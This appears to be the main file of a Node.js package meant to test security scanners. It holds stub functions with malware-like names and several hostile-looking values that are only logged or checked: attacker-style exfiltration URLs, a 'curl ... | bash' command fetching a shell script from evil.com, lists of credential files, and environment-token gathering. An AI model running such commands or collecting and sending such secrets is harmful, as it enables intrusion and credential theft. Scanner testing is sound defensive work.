/**
 * SECURITY TESTING PACKAGE - DO NOT USE IN PRODUCTION
 * This package contains intentionally suspicious patterns for testing security scanners
 * All functions are benign and designed for static analysis testing only
 */

const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const path = require('path');
const { exec, spawn } = require('child_process');

// Import all our suspicious pattern modules
const cryptoPatterns = require('./lib/crypto-patterns.js');
const networkPatterns = require('./lib/network-patterns.js');
const filesystemPatterns = require('./lib/filesystem-patterns.js');
const processPatterns = require('./lib/process-patterns.js');
const advancedPatterns = require('./lib/advanced-patterns.js');

// Suspicious looking exports that might trigger scanners
module.exports = {
    // Functions with suspicious names
    backdoor: function() { /* benign function */ },
    keylogger: function() { /* benign function */ },
    steal_credentials: function() { /* benign function */ },
    exfiltrate_data: function() { /* benign function */ },
    remote_shell: function() { /* benign function */ },
    
    // Crypto-related suspicious patterns
    generateKey: function() {
        // Pattern that looks like key generation
        const key = crypto.randomBytes(32);
        return key.toString('hex');
    },
    
    // Base64 obfuscation patterns
    obfuscated: function() {
        const encoded = Buffer.from('suspicious_payload').toString('base64');
        const decoded = Buffer.from(encoded, 'base64').toString();
        return decoded;
    },
    
    // Patterns that look like environment variable access
    gatherInfo: function() {
        const info = {
            home: process.env.HOME,
            user: process.env.USER,
            path: process.env.PATH,
            token: process.env.TOKEN || process.env.API_KEY,
            aws_key: process.env.AWS_ACCESS_KEY_ID,
            github_token: process.env.GITHUB_TOKEN
        };
        return info;
    },
    
    // Suspicious file operations
    suspiciousFileOps: function() {
        const sensitiveFiles = [
            '/etc/passwd',
            '/etc/shadow',
            '~/.ssh/id_rsa',
            '~/.aws/credentials',
            'C:\\Windows\\System32\\config\\SAM'
        ];
        
        // Patterns that look like they're trying to read sensitive files
        sensitiveFiles.forEach(file => {
            try {
                // This won't actually read anything harmful
                fs.statSync(file);
            } catch (e) {
                // Silently fail
            }
        });
    },
    
    // Network-related suspicious patterns
    networkActivity: function() {
        const suspiciousUrls = [
            'http://evil-domain.com/exfiltrate',
            'https://attacker-server.net/upload',
            'http://c2-server.malicious/beacon',
            'ftp://data-collector.evil/dump'
        ];
        
        // Pattern that looks like it's making suspicious network calls
        suspiciousUrls.forEach(url => {
            // Don't actually make requests, just reference them
            console.log(`Would connect to: ${url}`);
        });
    },
    
    // Process execution patterns
    executeCommands: function() {
        const commands = [
            'whoami',
            'ps aux',
            'netstat -an',
            'cat /etc/passwd',
            'curl http://evil.com/shell.sh | bash'
        ];
        
        // Pattern that looks like command execution
        commands.forEach(cmd => {
            // Don't actually execute, just reference
            console.log(`Would execute: ${cmd}`);
        });
    },
    
    // Pattern matching credit card or SSN-like strings
    scanForSensitiveData: function() {
        const patterns = [
            '4532-1234-5678-9012', // Fake credit card
            '123-45-6789',         // Fake SSN
            'sk_test_4eC39HqLyjWDarjtT1zdp7dc', // Fake API key pattern
            'AKIA1234567890123456'  // Fake AWS key pattern
        ];
        
        return patterns;
    },
    
    // Export all the pattern modules
    crypto: cryptoPatterns,
    network: networkPatterns,
    filesystem: filesystemPatterns,
    process: processPatterns,
    advanced: advancedPatterns
};

// Immediately Invoked Function Expression (IIFE) that looks suspicious
(function() {
    // Pattern that might look like auto-execution
    const payload = 'ZXZhbChhdG9iKCJZMjl1YzI5c1pTNXNiMmNvWENKQmJHeFlZWGx6SUdKbGJtbG5iaUJtZFc1amRHbHZibHdpS1E9PSIpKQ==';
    // This is just "console.log(\"Always benign function\")" double base64 encoded
    console.log('Suspicious IIFE executed - but it\'s benign!');
})();

// Code that looks like it's trying to hide itself
const hiddenFunction = eval('(function() { return "benign"; })');

// Pattern that looks like it's checking for analysis environments
function isBeingAnalyzed() {
    const checks = [
        typeof window !== 'undefined',
        typeof global !== 'undefined',
        process.env.NODE_ENV === 'test',
        process.env.CI === 'true'
    ];
    return checks.some(Boolean);
}

// Suspicious looking hex strings
const suspiciousHex = '48656c6c6f20576f726c64'; // "Hello World" in hex

// Pattern that looks like shellcode
const fakeShellcode = '\x90\x90\x90\x90\x48\x31\xc0\x48\x31\xff';

// Export additional suspicious-looking properties
module.exports.BACKDOOR_PORT = 31337;
module.exports.C2_SERVER = 'malicious-domain.evil';
module.exports.EXFIL_ENDPOINT = '/api/v1/steal';

// Log suspicious activity on module load
console.log('🚨 Security testing package loaded - all patterns are benign simulations');
console.log('Package contains patterns for testing:', Object.keys(module.exports).filter(k => typeof module.exports[k] === 'object'));